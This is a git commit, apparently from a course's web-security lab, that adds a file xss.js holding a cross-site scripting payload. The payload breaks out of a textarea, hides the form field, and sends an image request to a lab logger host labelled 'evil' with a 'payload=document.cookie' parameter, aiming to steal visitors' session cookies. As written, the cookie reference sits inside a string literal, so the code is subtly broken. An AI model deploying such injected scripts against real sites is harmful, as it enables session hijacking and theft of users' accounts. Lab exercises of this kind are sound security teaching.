ffbdc8800e3fbf3a9dba71439b379a70aa20a6c1
martin <martin.zivojinovic@etu.u-bordeaux.fr>
2025-09-11 11:57:00 +0200

    First and second (martin)

---
+++ xss.js
@@ -0,0 +1,5 @@
+// </textarea><script>
+let areas = document.getElementsByTagName("textarea");
+areas[0].style.display = "none";
+javascript:void((new Image()).src='http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?' + 'to=evil ' + '&payload=document.cookie' + '&random=' + Math.random());
+//</script><textarea>
